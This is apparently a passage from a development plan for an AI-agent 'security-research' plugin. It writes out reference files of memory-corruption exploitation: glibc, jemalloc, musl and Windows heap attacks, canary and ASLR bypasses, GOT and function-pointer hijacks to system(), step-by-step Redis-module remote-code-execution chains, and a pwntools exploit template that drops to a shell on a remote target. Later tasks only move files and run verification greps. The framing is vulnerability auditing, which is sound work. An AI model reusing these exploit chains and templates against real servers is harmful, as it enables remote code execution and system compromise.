# 6. alloc → gets target_addr (arbitrary write location)
```

### tcache Key Bypass (glibc ≥ 2.32)
```python
# glibc 2.32+ adds a tcache key (random value at chunk+8) to detect double-free.
# Bypass: overwrite the key field before the second free.
# UAF write: set *(chunk+8) = 0 or any value != tcache_key
# Then free again — bypasses the double-free check
```

### tcache Safe-Linking Bypass (glibc ≥ 2.34)
```python
# fd pointers in tcache are obfuscated: fd = real_fd ^ (chunk_addr >> 12)
# To poison: need to know chunk address (or leak it)
# poisoned_fd = target ^ (chunk_addr >> 12)
```

### Fastbin Dup (glibc < 2.32 or with tcache full)
```python
# 1. alloc A, alloc B (size <= 0x80 on x86-64)
# 2. free A → fastbin: A
# 3. free B → fastbin: B → A
# 4. free A → fastbin: A → B → A (double free — bypasses consecutive check)
# 5. alloc → A (write fd = target)
# 6. alloc → B
# 7. alloc → A again
# 8. alloc → target (arbitrary write)
```

### Unsorted Bin Attack
```python
# Free a chunk into unsorted bin (size > tcache max, not top chunk adjacent)
# The fd/bk pointers contain &main_arena+88 — libc leak
# Read via UAF or controlled output
leaked_arena = u64(read_from_freed_chunk())
libc_base = leaked_arena - (main_arena_offset + 88)
```

### House of Force (old glibc, requires top chunk overflow)
```python
# Overwrite top chunk size to 0xffffffffffffffff
# malloc(target_addr - top_chunk_addr - 2*SIZE_SZ) moves top chunk
# Next malloc returns target_addr
```

## 4. Heap Exploitation — jemalloc

### Region Spray for Adjacency
```python
# jemalloc uses runs of same-size regions
# Spray: allocate many chunks of target size to fill current run
# The next allocation starts a new run — first chunk is at a predictable offset
# Allocate victim buffer, then attacker buffer — adjacent in the new run
```

### tcache Reuse (Deterministic)
```python
# jemalloc tcache: per-thread free list, LIFO
# free(A) → tcache: A
# malloc(same_size) → returns A (deterministic reuse)
# REF2 exploits this: free reader's topk->heap, RESTORE writer occupies same slot
```

### Run Metadata Corruption
```python
# If you can overflow into jemalloc run header (mapbits):
# Corrupt the "allocated" bit to make jemalloc think a live allocation is free
# Next malloc of same size may return the "freed" (still live) allocation → UAF
```

## 5. Heap Exploitation — musl-malloc

### Group Corruption
```python
# musl-malloc organizes allocations into groups within mmap'd regions
# Each group has metadata (struct group) at the start
# Overflow into group metadata → corrupt the free list
# Key target: group->first_free pointer
```

### Unbin Attack
```python
# musl's unbin macro: b->prev->next = b->next; b->next->prev = b->prev;
# Classic unlink-style write: control prev/next for arbitrary write
```

## 6. Heap Exploitation — Windows

### Low Fragmentation Heap (LFH)
```python
# LFH activates after 18 consecutive allocations of the same size
# LFH randomizes allocation order within a subsegment
# Spray strategy: allocate ~N*subsegment_size to fill subsegments
# Overflow hits adjacent chunk with probability 1/N
```

### Segment Heap (Windows 10+)
```python
# Segment heap replaces NT heap for many processes
# VS (Variable Size) allocations: metadata in separate page
# LFH blocks: 16-byte granularity, randomized placement
# Key difference: chunk headers are encoded (XOR with heap pointer)
```

## 7. ASLR/PIE Bypass Techniques

### Format string leak
```python
# Leak libc address from stack:
p.sendline(b".".join([f"%{i}$p".encode() for i in range(1, 30)]))
# Look for 0x7f?????????? pattern (libc addresses)
```

### Partial overwrite (no ASLR bypass needed)
```python
# Overwrite only the lower 12-16 bits of a return address or GOT entry
# Lower 12 bits are NOT randomized (page-aligned)
# 4-bit brute force for 16-bit overwrite (1/16 chance)
```

### /proc/self/maps (if readable)
```python
# Direct ASLR defeat if /proc is accessible:
with open('/proc/self/maps') as f:
    for line in f:
        if 'libc' in line:
            base = int(line.split('-')[0], 16)
```

### Auxiliary vector traversal (REF1 Chain 1 pattern)
```python
# Read process stack → find ELF auxiliary vector AT_BASE (ld-linux base)
# Traverse _r_debug.r_map link map to resolve libc.so.6 base address
# Requires: arbitrary read primitive
```

### Heap pointer correlation (REF1 Chain 2 pattern)
```python
# Read 2MB heap blob via arbitrary read
# Extract pointers, group by 1MB windows above heap
# For each candidate base: probe for \x7fELF magic
# Verify by reading GOT entries — multiple should resolve to known libc offsets
```

### DEBUG OBJECT info leak (REF2 pattern)
```python
# Redis-specific: DEBUG OBJECT <key> returns robj address
# Chase: robj->ptr → dict->type → entryHashDictType (static in redis-server)
# Compute PIE base from known offset of entryHashDictType
# Requires: enable-debug-command yes/local
```

## 8. Stack Canary Bypass

### Format string canary leak
```python
p.sendline(b"%11$p")  # adjust offset for target binary
canary = int(p.recvline().strip(), 16)
# Linux canaries end in \x00 (LSB is always null)
```

### Byte-by-byte brute force (forking server)
```python
# Fork-based servers share the same canary across children
# Brute force one byte at a time: 256 * 7 = 1792 attempts max (x86-64)
for byte_pos in range(7):  # skip LSB (always 0x00)
    for guess in range(256):
        payload = b"A" * canary_offset + known_bytes + bytes([guess])
        # If child doesn't crash → correct byte
```

### Overwrite with known value (if canary is leaked elsewhere)
```python
# If canary is leaked via info disclosure, simply include it in the overflow payload
payload  = b"A" * offset_to_canary
payload += p64(leaked_canary)
payload += b"B" * 8           # saved RBP
payload += p64(rop_chain)
```

## 9. Control Flow Hijack

### GOT overwrite (Partial RELRO)
```python
# Partial RELRO: .got.plt is writable after relocation
# Overwrite function@GOT with target address (e.g., system)
# REF1 Chain 2: strstr@GOT in redistimeseries.so → system()
# Trigger: any code path calling strstr with attacker-controlled first arg
```

### Function pointer overwrite (Full RELRO compatible)
```python
# When GOT is read-only, target writable function pointers in heap/data:
# REF1 Chain 1: dictType.hashFunction → system()
# Trigger: HSET with attacker-controlled field name
# Key: find writable structs containing function pointers
```

### vtable corruption (C++)
```python
# C++ virtual dispatch: obj->vtable[method_index](obj)
# Overwrite vtable pointer to point to attacker-controlled fake vtable
# Fake vtable: method_index entry = system or one_gadget
# Trigger: any virtual method call on the corrupted object
```

### moduleType hijack (REF2 pattern)
```python
# Redis module values: moduleValue { type, value }
# type->free(value) called on DEL
# Craft fake moduleType with free = system()
# Overwrite victim moduleValue to point to fake type + command string
# DEL victim → system(command)
```

## 10. Language-Specific Exploitation

### Rust unsafe — bypass bounds checking
```rust
// If unsafe block does: *ptr.add(offset) = val
// And offset is attacker-controlled with no bounds check:
// Write arbitrary value at arbitrary offset from ptr
// Convert to arbitrary write by controlling ptr base + offset
```

### Go runtime — cgo pointer escape
```go
// If Go pointer escapes to C and GC runs:
// The Go pointer may be moved or collected
// C code now has dangling pointer → UAF
// Trigger: force GC with runtime.GC() from another goroutine
```

### Python object struct corruption
```python
# CPython objects have a refcount + type pointer at fixed offsets
# If you can write to a Python object's memory (via ctypes or C extension bug):
# Overwrite ob_type → fake type with tp_dealloc = system
# When refcount hits 0 → tp_dealloc(obj) → system(obj)
```
````

- [ ] **Step 2: Commit**

```bash
git add plugins/security-research/skills/detect-memory/references/payloads.md
git commit -m "feat(security-research): add memory exploitation payloads reference"
```

---

### Task 5: Create references/exploitation.md

**Files:**
- Create: `plugins/security-research/skills/detect-memory/references/exploitation.md`

- [ ] **Step 1: Write exploitation.md**

Write the file `plugins/security-research/skills/detect-memory/references/exploitation.md` with the following complete content:

````markdown
# Memory Safety — Exploitation Chain Construction Guide

This guide walks through building a complete exploitation chain from a confirmed memory vulnerability to remote code execution. Modeled after the multi-chain exploitation demonstrated in REF1 (RedisTimeSeries OOB → RCE) and REF2 (RedisBloom Invalid Free → UAF → RCE).

## Phase 1: Binary Hardening Assessment

Before exploitation planning, catalog the security posture of every relevant binary.

```bash
checksec --file=./target_binary
# or:
python3 -c "from pwn import *; print(ELF('./target_binary').checksec())"
# or:
readelf -l ./target_binary | grep -i stack
readelf -d ./target_binary | grep -i bind
```

### Hardening Properties Table

| Property | Effect | Bypass Strategy |
|----------|--------|-----------------|
| **PIE** | Randomizes binary base address | Leak binary pointer (DEBUG OBJECT, format string) |
| **NX/DEP** | Stack/heap not executable | ROP chain (ret2libc, one_gadget) |
| **Stack Canary** | Detects stack buffer overflow | Leak canary (format string, byte-by-byte brute force) |
| **Partial RELRO** | GOT writable after relocation | GOT overwrite (REF1 Chain 2) |
| **Full RELRO** | GOT read-only after init | Target function pointers in heap/data (REF1 Chain 1, REF2) |
| **CFI** | Validates indirect call targets | More constrained, need valid function signatures |

### Multi-Binary Analysis

When targeting applications with dynamically loaded modules (Redis + .so modules, nginx + modules, Python + C extensions):
- **Check each binary independently** — protections may differ across modules
- **Identify the weakest link** — REF1 exploited redistimeseries.so's Partial RELRO while redis-server itself could have been Full RELRO
- **Example hardening table:**

```
| Binary              | PIE | NX  | Canary | RELRO   |
|---------------------|-----|-----|--------|---------|
| redis-server        | Yes | Yes | No     | Partial |
| redistimeseries.so  | Yes | Yes | No     | Partial | ← Chain 2 target
| redisbloom.so       | Yes | Yes | No     | Partial |
```

## Phase 2: Primitive Classification

Map each confirmed vulnerability to the exploitation primitive it provides:

| Primitive Type | Description | Example |
|---------------|-------------|---------|
| **Arbitrary Write** | Write attacker data to attacker-chosen address | Heap overflow corrupting adjacent struct (REF1: SBLink.inner.bf) |
| **Arbitrary Read** | Read data from attacker-chosen address | UAF + string read (REF2: TOPK.LIST reads from controlled item ptr) |
| **Arbitrary Free** | Free allocation at attacker-chosen address | Error-path free of attacker pointer (REF2: TopKRdbLoad cleanup) |
| **Info Leak** | Disclose address of code/data regions | OOB read via strlen (REF2: CString over-read), heap pointer in output |
| **Control Flow Hijack** | Redirect execution to attacker-chosen address | Function pointer overwrite (REF1: dictType, REF2: moduleType) |

### Primitive Strength Hierarchy

From weakest to strongest — your exploitation plan works upward:
1. **Limited read/write** (fixed offset, small range) → use to gain info leak
2. **Info leak** → use to defeat ASLR/PIE
3. **Arbitrary read** → use to resolve symbols, find targets
4. **Arbitrary write** → use to overwrite function pointers or GOT
5. **Control flow hijack** → achieve RCE

## Phase 3: Information Leak Strategy

Select strategy based on target protections:

### No PIE
```python
# Binary base is fixed — use hardcoded addresses
system_plt = elf.plt['system']  # known at compile time
```

### PIE + No ASLR
```python
# Binary base is randomized but consistent per boot
# Brute force or leak once, reuse
```

### Full ASLR + PIE (most common)

**Strategy A: Stack-based leak (REF1 Chain 1)**
```python
# Requires: arbitrary read primitive
# 1. Read process stack (find via /proc/self/maps or heuristic scan)
# 2. Locate ELF auxiliary vector: AT_BASE (tag 7) = ld-linux.so base
# 3. Read ld-linux's _r_debug.r_map → linked list of loaded libraries
# 4. Walk link map: l_name, l_addr for each .so → find libc.so.6
# 5. Compute system() = libc_base + known_offset
```

**Strategy B: Heap pointer correlation (REF1 Chain 2)**
```python
# Requires: arbitrary read primitive, ability to scan large memory region
# 1. Read a large heap region (e.g., 2MB via BF.SCANDUMP)
# 2. Extract all pointer-sized values (8 bytes aligned, 0x7f?????????? range)
# 3. Group by 1MB windows — high-frequency window likely contains a .so base
# 4. For each candidate base: check if address + 0 contains \x7fELF magic
# 5. If ELF found: read its .got.plt entries, verify they point into libc
# 6. Cross-validate: multiple GOT entries should yield same libc base
```

**Strategy C: Application-specific diagnostic (REF2)**
```python
# Redis: DEBUG OBJECT <key> → address of robj
# Chase: robj → ptr (dict*) → type (dictType*) → known static in binary
# Compute: PIE_base = dictType_addr - known_offset_of_entryHashDictType
# Then: read GOT entries to get libc addresses
```

**Strategy D: Format string leak**
```python
# If format string vulnerability exists:
p.sendline(b"%p." * 20)
# Parse output for libc addresses (0x7f??????????)
# Compute libc base from known offsets
```

**Strategy E: Partial overwrite (no leak needed)**
```python
# Overwrite only lower 12-16 bits of return address
# Lower 12 bits are deterministic (page offset)
# 4-bit brute force for 16-bit overwrite: 1/16 success rate
```

## Phase 4: Heap Grooming

Arrange heap layout so the vulnerable buffer is adjacent to the target structure.

### glibc ptmalloc

```python
# tcache: per-thread, 64 bins (sizes 0x20-0x410 on x86-64), 7 entries each
# Strategy: fill tcache bin → force allocations to use fastbin/smallbin/unsorted

# Step 1: Fill tcache for target size
for i in range(7):
    alloc(target_size)
for i in range(7):
    free(chunks[i])

# Step 2: Allocate victim + attacker adjacent
victim = alloc(target_size)   # from fastbin/smallbin
attacker = alloc(target_size) # adjacent to victim

# Step 3: Overflow victim → corrupts attacker's data
```

### jemalloc

```python
# jemalloc: runs of same-size regions, thread-local tcache
# Key property: allocations of same size class are sequential within a run

# Step 1: Spray to fill current run
for i in range(run_fill_count):
    alloc(target_size)

# Step 2: New run starts — first allocations are adjacent
victim = alloc(target_size)
target_struct = alloc(target_size)

# REF1 used this: TS samples (64B) and BF SBLink groomed to be adjacent
# REF2 exploited deterministic tcache reuse: free + realloc same slot
```

### musl-malloc

```python
# musl: group-based allocation within mmap'd regions
# Groups contain slots of uniform size
# Spray strategy: fill groups to force new group allocation
# Adjacent allocations within same group are sequential
```

### Windows (LFH)

```python
# LFH activates after 18 same-size allocations
# LFH subsegments: randomized slot order, fixed count
# Strategy: over-spray (allocate >> subsegment_size)
# Statistical adjacency: more spray = higher collision probability
```

## Phase 5: Primitive Escalation

Convert a limited primitive into full arbitrary read/write.

### OOB Write → Corrupt Adjacent Struct → Stronger Primitive
```python
# REF1 pattern:
# 1. OOB write (16 bytes past TS samples buffer)
# 2. Corrupts adjacent BF SBLink: link->inner.bf = attacker_addr, link->inner.bytes = large
# 3. BF.SCANDUMP reads from bf+offset → arbitrary read
# 4. BF.LOADCHUNK writes to bf+offset → arbitrary write
# Limited OOB → full process memory access
```

### UAF → Controlled Reallocation → Type Confusion → Arb R/W
```python
# REF2 pattern:
# 1. Free live topk->heap allocation (via invalid free primitive)
# 2. RESTORE new TopK whose data blob occupies the freed slot (jemalloc tcache reuse)
# 3. Writer controls HeapBucket.item = target_address, count = 1
# 4. Reader's TOPK.LIST calls ReplyWithCString(item) → reads from target_address
# UAF → controlled reallocation → arbitrary read
```

### Info Leak → Compute Bases → Targeted Overwrite
```python
# Once you have arbitrary read + libc/PIE leak:
# 1. Read GOT entries to resolve all libc symbols
# 2. Compute system(), one_gadget addresses
# 3. Identify writable function pointer targets
# 4. Single targeted write to hijack control flow
```

## Phase 6: Control Flow Hijack

### Partial RELRO: GOT Overwrite (REF1 Chain 2)
```python
# Target: strstr@GOT in redistimeseries.so
# Overwrite: strstr → system
# Trigger: TS.MRANGE ... FILTER <shell_command>
#   → parseLabelListFromArgs() calls strstr(label, "!=(")
#   → now calls system(label)
#
# Important: restore original GOT entry after exploit to prevent crashes
```

### Full RELRO: Function Pointer in Writable Data (REF1 Chain 1)
```python
# Target: dictType.hashFunction (heap-allocated struct)
# Overwrite: hashFunction → system
# Trigger: HSET __trig <shell_command> v
#   → dict lookup calls hashFunction(key) → system(shell_command)
#
# No GOT needed — function pointer in writable heap data
```

### moduleType Hijack (REF2)
```python
# Target: moduleValue.type pointer (heap)
# Steps:
# 1. Allocate fake moduleType on heap with free = system() at offset 72
# 2. Allocate command string on heap
# 3. Free victim key's moduleValue allocation
# 4. Reallocate with [fake_type_ptr, cmd_ptr]
# 5. DEL victim → freeModuleObject() → mv->type->free(mv->value) → system(cmd)
```

### C++ vtable Pointer Overwrite
```python
# Overwrite object's vtable pointer to attacker-controlled memory
# Fake vtable: target method slot → system or one_gadget
# Trigger: any virtual method call on the corrupted object
```

## Phase 7: Full Exploit Template

```python
#!/usr/bin/env python3
"""
Full exploitation template — adapt to specific target.
"""
from pwn import *

context.binary = './target'
context.log_level = 'info'

elf  = ELF('./target')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def start():
    if args.REMOTE:
        return remote(args.HOST or 'target.com', int(args.PORT or 9001))
    return process('./target')

# ========== Phase 1: Information Leak ==========
p = start()

# [ADAPT] Trigger info leak — format string, OOB read, UAF read, etc.
p.recvuntil(b"Input: ")
p.sendline(b"%15$p")
leak = int(p.recvline().strip(), 16)
libc.address = leak - libc.sym['__libc_start_main'] - 243
log.success(f"libc base @ {hex(libc.address)}")

system = libc.sym['system']
bin_sh = next(libc.search(b'/bin/sh\x00'))
log.success(f"system @ {hex(system)}")

# ========== Phase 2: Heap Grooming (if needed) ==========
# [ADAPT] Arrange heap for adjacency or tcache state

# ========== Phase 3: Primitive Construction ==========
# [ADAPT] Use initial vuln to build arb read/write primitive

# ========== Phase 4: Payload Delivery ==========
# [ADAPT] Overwrite target (GOT, function pointer, vtable)
# Example: GOT overwrite
# arb_write(elf.got['target_func'], system)

# ========== Phase 5: Trigger RCE ==========
# [ADAPT] Call the hijacked function with shell command as argument
# Example: target_func("/bin/sh") → system("/bin/sh")

p.interactive()
```

## Phase 8: Chain Documentation Format

When documenting a confirmed exploitation chain, use this structure (matching REF1/REF2 advisory format):

### Advisory Template

```markdown
# Advisory: [Component] [Vuln Type] → [Impact]

## Advisory Details
**Title:** [Full descriptive title with CWE references]

## Summary
[3-4 sentences: what the bug is, how it's exploited, what the impact is]

## Details

### Root Cause / Vulnerability [A/B/C/...]: [Issue] (CWE-XXX)
**File:** `path/to/file.c`
**Function:** `FunctionName()` (line ~NNN)

[Code block showing vulnerable code with inline comments]

**Root Cause:** [Paragraph explaining WHY this is vulnerable]
**Primitive:** [One line: what exploitation primitive this provides]

### Exploitation Chain
1. **[Step Name]:** [What the attacker does and what it achieves]
2. **[Step Name]:** [Next step...]
...

### Binary Hardening
| Binary | PIE | NX | Canary | RELRO |
|--------|-----|----|--------|-------|
| ...    | ... | ...| ...    | ...   |

## PoC
[Script names, expected output]

### Prerequisites / Special Conditions
1. [Numbered list of requirements]

### Reproduction Steps
1. [Brief numbered walkthrough]

## Impact
[1-2 sentences on severity and who is affected]

## Affected Products
- **Ecosystem:** [...]
- **Package name:** [...]
- **Affected versions:** [...]

## Severity
**[Level]**
**CVSS:3.1/AV:.../AC:.../PR:.../UI:.../S:.../C:.../I:.../A:...** — Score: X.X
- **AV:...** — [justification]
- **AC:...** — [justification]
...

## Weaknesses
- **CWE-XXX:** [Description] (primary)
- **CWE-YYY:** [Description] (secondary)

## Recommended Fix
1. [Specific code fix with code block]
2. [Build hardening recommendations]
```
````

- [ ] **Step 2: Commit**

```bash
git add plugins/security-research/skills/detect-memory/references/exploitation.md
git commit -m "feat(security-research): add exploitation chain construction guide for detect-memory"
```

---

### Task 6: Remove memory content from detect-injection

**Files:**
- Modify: `plugins/security-research/skills/detect-injection/SKILL.md:27,151-157,192-194`
- Modify: `plugins/security-research/skills/detect-injection/references/patterns.md:1122-1260`
- Modify: `plugins/security-research/skills/detect-injection/references/payloads.md:981-1078`
- Modify: `plugins/security-research/skills/detect-injection/references/exploitation.md:838-1005`

- [ ] **Step 1: Remove memory row from coverage table in SKILL.md**

In `plugins/security-research/skills/detect-injection/SKILL.md`, replace the memory coverage row (line 27):

```
| **Memory** | Buffer overflow, use-after-free, double free, format string, integer overflow, OOB access (C/C++/unsafe Rust only) |
```

with:

```
> **Note:** For memory safety vulnerabilities (buffer overflow, UAF, format string, integer overflow, unsafe bindings), see `detect-memory`.
```

- [ ] **Step 2: Remove Memory Corruption grep section from SKILL.md**

In `plugins/security-research/skills/detect-injection/SKILL.md`, remove lines 151-157 (the entire "Memory Corruption (C/C++ only)" grep subsection including the heading and code block).

- [ ] **Step 3: Remove memory confirmation rules from SKILL.md**

In `plugins/security-research/skills/detect-injection/SKILL.md`, remove these three rows from the Confirmation Rules table (lines 192-194):

```
| `strcpy(fixed_buf, user_str)` | CRITICAL — buffer overflow |
| `printf(user_format)` | HIGH — format string |
| `free(ptr); *ptr = val` | HIGH — UAF |
```

- [ ] **Step 4: Remove Section 12 from patterns.md**

In `plugins/security-research/skills/detect-injection/references/patterns.md`, replace the entire Section 12 "Memory Corruption" (lines 1122-1259) with:

```markdown
## 12. Memory Corruption

> Memory corruption patterns have been moved to the `detect-memory` skill. See `detect-memory/references/patterns.md`.
```

- [ ] **Step 5: Remove Section 13 from payloads.md**

In `plugins/security-research/skills/detect-injection/references/payloads.md`, replace the entire Section 13 "Memory Corruption Payloads" (lines 981-1078) with:

```markdown
## 13. Memory Corruption Payloads

> Memory corruption payloads have been moved to the `detect-memory` skill. See `detect-memory/references/payloads.md`.
```

- [ ] **Step 6: Remove Section 11 from exploitation.md**

In `plugins/security-research/skills/detect-injection/references/exploitation.md`, replace the entire Section 11 "Memory Corruption Exploitation" (lines 838-1005) with:

```markdown
## 11. Memory Corruption Exploitation

> Memory corruption exploitation guidance has been moved to the `detect-memory` skill. See `detect-memory/references/exploitation.md`.
```

- [ ] **Step 7: Commit**

```bash
git add plugins/security-research/skills/detect-injection/SKILL.md \
       plugins/security-research/skills/detect-injection/references/patterns.md \
       plugins/security-research/skills/detect-injection/references/payloads.md \
       plugins/security-research/skills/detect-injection/references/exploitation.md
git commit -m "refactor(security-research): move memory content from detect-injection to detect-memory"
```

---

### Task 7: Update security-orchestrator to invoke detect-memory

**Files:**
- Modify: `plugins/security-research/agents/security-orchestrator.md:349-352`

- [ ] **Step 1: Add detect-memory invocation**

In `plugins/security-research/agents/security-orchestrator.md`, find the Stage A automated scan section (around line 349-352) where the four detect-* skills are invoked:

```
skill="detect-injection" args="${TARGET_SOURCE} ${AUDIT_DIR}"
skill="detect-auth" args="${TARGET_SOURCE} ${AUDIT_DIR}"
skill="detect-logic" args="${TARGET_SOURCE} ${AUDIT_DIR}"
skill="detect-config" args="${TARGET_SOURCE} ${AUDIT_DIR}"
```

Add a new line after detect-config:

```
skill="detect-memory" args="${TARGET_SOURCE} ${AUDIT_DIR}"
```

- [ ] **Step 2: Commit**

```bash
git add plugins/security-research/agents/security-orchestrator.md
git commit -m "feat(security-research): add detect-memory to orchestrator scan stage"
```

---

### Task 8: Verify the implementation

- [ ] **Step 1: Verify file structure exists**

```bash
ls -la plugins/security-research/skills/detect-memory/
ls -la plugins/security-research/skills/detect-memory/references/
```

Expected:
```
SKILL.md
references/
  cool_techniques.md
  patterns.md
  payloads.md
  exploitation.md
```

- [ ] **Step 2: Verify SKILL.md frontmatter is valid**

```bash
head -7 plugins/security-research/skills/detect-memory/SKILL.md
```

Expected: valid YAML frontmatter with `name: detect-memory`, `user-invocable: false`.

- [ ] **Step 3: Verify detect-injection no longer has memory content**

```bash
grep -n "Memory Corruption\|buffer overflow\|use-after-free\|strcpy.*CRITICAL\|UAF" plugins/security-research/skills/detect-injection/SKILL.md
```

Expected: only the cross-reference note, no detection/exploitation content.

- [ ] **Step 4: Verify orchestrator includes detect-memory**

```bash
grep "detect-memory" plugins/security-research/agents/security-orchestrator.md
```

Expected: one line with `skill="detect-memory"`.

- [ ] **Step 5: Verify no broken cross-references**

```bash
grep -rn "detect-injection.*memory\|detect-injection.*buffer overflow\|detect-injection.*UAF" plugins/security-research/
```

Expected: no results (no stale references to memory content in detect-injection).
